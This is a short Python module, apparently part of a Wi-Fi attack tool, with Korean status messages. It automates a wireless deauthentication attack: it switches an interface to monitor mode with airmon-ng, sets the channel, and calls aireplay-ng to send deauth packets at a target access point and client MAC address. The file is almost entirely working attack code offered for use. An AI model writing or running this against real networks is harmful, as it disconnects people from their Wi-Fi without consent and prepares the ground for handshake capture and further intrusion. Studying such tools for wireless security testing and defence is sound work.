# core/deauth_attack.py

import subprocess
import os
import time

def start_monitor_mode(interface="wlan0"):
    print(f"[+] Monitor 모드 시작: {interface}")
    subprocess.run(["airmon-ng", "start", interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return interface + "mon"

def stop_monitor_mode(interface):
    print(f"[+] Monitor 모드 중지: {interface}")
    subprocess.run(["airmon-ng", "stop", interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def deauth_attack(ap_bssid, client_mac, channel, interface="wlan0"):
    monitor_interface = start_monitor_mode(interface)

    print(f"[+] 채널 설정: {channel}")
    subprocess.run(["iwconfig", monitor_interface, "channel", str(channel)])

    print(f"[+] Deauth 공격 실행 중...\n    타겟 AP: {ap_bssid}, 클라이언트: {client_mac}")
    try:
        subprocess.run([
            "aireplay-ng",
            "--deauth", "10",              # 보낼 패킷 수
            "-a", ap_bssid,                # AP BSSID
            "-c", client_mac,              # Client MAC
            monitor_interface
        ])
    except KeyboardInterrupt:
        print("[!] 공격 중단됨.")
    finally:
        stop_monitor_mode(monitor_interface)

